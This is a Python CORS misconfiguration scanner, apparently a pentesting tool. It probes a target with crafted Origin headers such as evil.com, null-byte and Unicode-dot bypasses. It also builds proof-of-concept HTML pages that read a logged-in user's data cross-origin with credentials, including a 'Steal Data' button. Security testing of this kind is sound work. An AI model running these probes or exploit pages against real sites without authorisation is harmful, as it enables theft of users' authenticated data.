"""
auto_cors.py - Automated CORS misconfiguration scanner

Tests for:
- Origin reflection: arbitrary Origin reflected in ACAO
- Null origin: Origin: null accepted
- Subdomain trust: evil.TARGET.com accepted
- HTTP protocol downgrade: http://TARGET.com on HTTPS site
- Wildcard with credentials: * + Access-Control-Allow-Credentials: true
- Prefix/suffix matching bypass
- Special characters in Origin

Standalone: python auto_cors.py <url> [cookie]
"""

import re
import json
from urllib.parse import urlparse
from typing import Optional


def _get_session():
    """Get HTTP session with fallback."""
    try:
        from tools.probe import _get_session as _gs
        return _gs()
    except (ImportError, ModuleNotFoundError):
        import requests
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        return s


# ---------------------------------------------------------------------------
# Test definitions
# ---------------------------------------------------------------------------

_ORIGIN_TESTS = [
    # (test_id, origin_builder, description, severity)
    ("reflected_arbitrary",
     lambda t, d: "https://evil.com",
     "Arbitrary origin reflection",
     "high"),
    ("reflected_null",
     lambda t, d: "null",
     "Null origin accepted",
     "high"),
    ("subdomain_trust",
     lambda t, d: f"https://evil.{d}",
     "Subdomain trust (evil.TARGET)",
     "high"),
    ("subdomain_prefix_bypass",
     lambda t, d: f"https://{d}.evil.com",
     "Prefix match bypass (TARGET.evil.com)",
     "critical"),
    ("subdomain_suffix_bypass",
     lambda t, d: f"https://not{d}",
     "Suffix match bypass (notTARGET.com)",
     "high"),
    ("http_downgrade",
     lambda t, d: f"http://{t}",
     "HTTP protocol trust on HTTPS site",
     "medium"),
    ("random_subdomain",
     lambda t, d: f"https://xss.{d}",
     "Random subdomain trust",
     "high"),
    ("port_variation",
     lambda t, d: f"https://{d}:4444",
     "Origin with non-standard port accepted",
     "medium"),
    ("special_chars_dot",
     lambda t, d: f"https://evil{chr(0x00)}.{d}",
     "Null byte in origin",
     "high"),
    ("special_chars_percent",
     lambda t, d: f"https://{d}%60evil.com",
     "Percent-encoded backtick bypass",
     "high"),
    ("trusted_domain_injection",
     lambda t, d: f"https://{d}.evil.com",
     "Domain as subdomain of attacker domain",
     "critical"),
    ("regex_dot_bypass",
     lambda t, d: f"https://evil{chr(0xFF0E)}{d}",
     "Unicode dot bypass (fullwidth period)",
     "high"),
]


def _build_origin_tests(target_url: str) -> list:
    """Build test list from target URL."""
    parsed = urlparse(target_url)
    domain = parsed.hostname or ""
    # strip leading 'www.' for subdomain tests
    base_domain = re.sub(r'^www\.', '', domain)

    tests = []
    for test_id, origin_fn, desc, severity in _ORIGIN_TESTS:
        origin = origin_fn(target_url, base_domain)
        tests.append({
            "id": test_id,
            "origin": origin,
            "description": desc,
            "severity": severity,
        })
    return tests


# ---------------------------------------------------------------------------
# Core test function
# ---------------------------------------------------------------------------

def test_origin(url: str, origin: str, cookie: str = "",
                session=None) -> dict:
    """
    Test a single Origin header against the target URL.

    Returns dict with:
      - origin: the Origin header sent
      - acao: Access-Control-Allow-Origin value (or None)
      - acac: Access-Control-Allow-Credentials value (or None)
      - reflected: whether origin is reflected in ACAO
      - vulnerable: whether this is exploitable
      - details: human-readable explanation
    """
    s = session or _get_session()
    if cookie:
        s.headers['Cookie'] = cookie

    result = {
        "origin": origin,
        "acao": None,
        "acac": None,
        "expose_headers": None,
        "allow_methods": None,
        "allow_headers": None,
        "max_age": None,
        "reflected": False,
        "vulnerable": False,
        "details": "",
    }

    try:
        resp = s.get(url, headers={"Origin": origin}, timeout=15,
                     allow_redirects=False)
    except Exception as e:
        result["error"] = str(e)
        return result

    headers = {k.lower(): v for k, v in resp.headers.items()}
    acao = headers.get("access-control-allow-origin")
    acac = headers.get("access-control-allow-credentials")
    expose = headers.get("access-control-expose-headers")
    methods = headers.get("access-control-allow-methods")
    allow_hdrs = headers.get("access-control-allow-headers")
    max_age = headers.get("access-control-max-age")

    result["acao"] = acao
    result["acac"] = acac
    result["expose_headers"] = expose
    result["allow_methods"] = methods
    result["allow_headers"] = allow_hdrs
    result["max_age"] = max_age

    if acao:
        result["reflected"] = (acao == origin)
        result["wildcard"] = (acao == "*")

        # Vulnerability assessment
        is_credentials = acac and acac.lower() == "true"

        if acao == "*" and is_credentials:
            result["vulnerable"] = True
            result["details"] = "Wildcard origin with credentials=true (browsers block this, but config is broken)"
        elif result["reflected"] and is_credentials:
            result["vulnerable"] = True
            result["details"] = f"Origin reflected with credentials allowed — full cross-origin data theft"
        elif result["reflected"]:
            result["vulnerable"] = True
            result["details"] = f"Origin reflected without credentials — limited data leakage possible"
        elif acao == "*" and not is_credentials:
            result["details"] = "Wildcard origin (no credentials) — public resource, usually benign"
        elif acao == "null" and origin == "null":
            result["reflected"] = True
            result["vulnerable"] = True
            result["details"] = "Null origin accepted — exploitable via sandboxed iframe"
    else:
        result["details"] = "No CORS headers returned"

    return result


# ---------------------------------------------------------------------------
# Full scan
# ---------------------------------------------------------------------------

def scan(url: str, cookie: str = "") -> dict:
    """
    Full CORS misconfiguration scan.

    Returns dict with:
      - url: target
      - findings: list of vulnerable configurations
      - all_results: all test results
      - exploit_html: PoC HTML for highest-severity finding
      - severity: overall severity
    """
    results = {
        "url": url,
        "findings": [],
        "all_results": [],
        "exploit_html": "",
        "severity": "info",
        "baseline_acao": None,
    }

    session = _get_session()
    if cookie:
        session.headers['Cookie'] = cookie

    # 1. Baseline request (no Origin)
    try:
        baseline = session.get(url, timeout=15, allow_redirects=False)
        base_headers = {k.lower(): v for k, v in baseline.headers.items()}
        results["baseline_acao"] = base_headers.get("access-control-allow-origin")
        results["baseline_acac"] = base_headers.get("access-control-allow-credentials")
    except Exception as e:
        results["error"] = str(e)
        return results

    # 2. Run all origin tests
    tests = _build_origin_tests(url)
    for test in tests:
        test_result = test_origin(url, test["origin"], cookie, session)
        test_result["test_id"] = test["id"]
        test_result["description"] = test["description"]
        test_result["test_severity"] = test["severity"]
        results["all_results"].append(test_result)

        if test_result["vulnerable"]:
            finding = {
                "type": test["id"],
                "description": test["description"],
                "origin": test["origin"],
                "acao": test_result["acao"],
                "acac": test_result["acac"],
                "severity": _assess_severity(test["severity"],
                                             test_result["acac"]),
                "details": test_result["details"],
            }
            results["findings"].append(finding)
            results["severity"] = _max_severity(
                results["severity"], finding["severity"]
            )

    # 3. Generate exploit for best finding
    if results["findings"]:
        best = _best_finding(results["findings"])
        if best:
            results["exploit_html"] = generate_exploit(url, best["origin"])

    return results


def _assess_severity(base_severity: str, acac: Optional[str]) -> str:
    """Adjust severity based on credentials header."""
    if acac and acac.lower() == "true":
        _bump = {"low": "medium", "medium": "high", "high": "critical",
                 "critical": "critical"}
        return _bump.get(base_severity, base_severity)
    return base_severity


def _best_finding(findings: list) -> Optional[dict]:
    """Return highest-severity finding."""
    levels = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
    ranked = sorted(findings, key=lambda f: levels.get(f.get("severity", "info"), 0),
                    reverse=True)
    return ranked[0] if ranked else None


def _max_severity(s1: str, s2: str) -> str:
    """Return the higher of two severity levels."""
    levels = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
    return list(levels.keys())[max(levels.get(s1, 0), levels.get(s2, 0))]


# ---------------------------------------------------------------------------
# Exploit generation
# ---------------------------------------------------------------------------

def generate_exploit(url: str, origin: str) -> str:
    """
    Generate CORS exploit HTML that demonstrates data theft.

    Sends a cross-origin fetch to `url` using `origin` and displays
    the response body — proving the attacker can read protected data.
    """
    return f"""<html>
<head>
  <title>CORS Exploit PoC</title>
  <style>
    body {{ font-family: monospace; padding: 20px; background: #1e1e1e; color: #d4d4d4; }}
    h1 {{ color: #f44; font-size: 18px; }}
    #output {{ background: #2d2d2d; padding: 15px; border: 1px solid #555;
               white-space: pre-wrap; word-wrap: break-word; max-height: 500px;
               overflow: auto; margin-top: 10px; }}
    .ok {{ color: #4f4; }} .err {{ color: #f44; }}
  </style>
</head>
<body>
  <h1>CORS Exploit — Origin: {origin}</h1>
  <p>Target: <code>{url}</code></p>
  <button onclick="exploit()">Run Exploit</button>
  <div id="output"></div>
  <script>
    async function exploit() {{
      const out = document.getElementById('output');
      out.textContent = 'Sending cross-origin request...\\n';
      try {{
        const resp = await fetch('{url}', {{
          credentials: 'include',
          mode: 'cors'
        }});
        const body = await resp.text();
        out.innerHTML = '<span class="ok">[+] Response received (' +
                        body.length + ' bytes):</span>\\n\\n' +
                        escapeHtml(body).substring(0, 5000);
      }} catch(e) {{
        out.innerHTML = '<span class="err">[-] Error: ' +
                        escapeHtml(e.message) + '</span>';
      }}
    }}

    function escapeHtml(s) {{
      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;')
              .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }}
  </script>
</body>
</html>"""


def generate_xhr_exploit(url: str, origin: str, data_endpoint: str = "") -> str:
    """
    Generate XHR-based CORS exploit for older browser compatibility.
    Also demonstrates cookie inclusion.
    """
    target = data_endpoint or url
    return f"""<html>
<head>
  <title>CORS XHR Exploit</title>
  <style>
    body {{ font-family: monospace; padding: 20px; }}
    #result {{ background: #f0f0f0; padding: 10px; white-space: pre-wrap; }}
  </style>
</head>
<body>
  <h2>CORS XHR PoC</h2>
  <p>Origin: <code>{origin}</code> | Target: <code>{target}</code></p>
  <button onclick="run()">Steal Data</button>
  <pre id="result"></pre>
  <script>
    function run() {{
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '{target}', true);
      xhr.withCredentials = true;
      xhr.onreadystatechange = function() {{
        if (xhr.readyState === 4) {{
          document.getElementById('result').textContent =
            'Status: ' + xhr.status + '\\n' +
            'Headers: ' + xhr.getAllResponseHeaders() + '\\n\\n' +
            xhr.responseText;
        }}
      }};
      xhr.send();
    }}
  </script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Standalone CLI
# ---------------------------------------------------------------------------

def _print_report(result: dict) -> None:
    """Pretty-print scan results to stdout."""
    print(f"\n{'='*60}")
    print(f"  CORS Scan: {result['url']}")
    print(f"{'='*60}")

    baseline = result.get("baseline_acao")
    if baseline:
        print(f"  Baseline ACAO (no Origin): {baseline}")
    else:
        print(f"  Baseline ACAO: (none)")

    if result.get("error"):
        print(f"\n  [!] Error: {result['error']}")
        return

    if not result.get("findings"):
        print(f"\n  [OK] No CORS misconfigurations found.")
    else:
        print(f"\n  [!!] {len(result['findings'])} finding(s) — "
              f"Overall: {result['severity'].upper()}\n")

        for i, f in enumerate(result["findings"], 1):
            sev = f["severity"].upper()
            print(f"  [{sev}] #{i}: {f['description']}")
            print(f"         Origin:  {f['origin']}")
            print(f"         ACAO:    {f['acao']}")
            print(f"         ACAC:    {f.get('acac', 'not set')}")
            print(f"         Detail:  {f['details']}")
            print()

    if result.get("exploit_html"):
        print(f"  [*] Exploit HTML generated ({len(result['exploit_html'])} chars)")
        print(f"      (use --exploit to write to file)")

    # Show all test results summary
    tested = len(result.get("all_results", []))
    blocked = sum(1 for r in result.get("all_results", [])
                  if not r.get("acao"))
    reflected = sum(1 for r in result.get("all_results", [])
                    if r.get("reflected"))
    print(f"\n  Tests: {tested} | Blocked: {blocked} | "
          f"Reflected: {reflected} | Vuln: {len(result.get('findings', []))}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python auto_cors.py <url> [cookie]")
        print("       python auto_cors.py https://example.com")
        print("       python auto_cors.py https://example.com 'session=abc123'")
        sys.exit(1)

    target_url = sys.argv[1]
    cookie = sys.argv[2] if len(sys.argv) > 2 else ""

    result = scan(target_url, cookie)

    # Print human-readable report
    _print_report(result)

    # Also dump JSON
    print("\n--- JSON ---")
    print(json.dumps(result, indent=2, default=str))
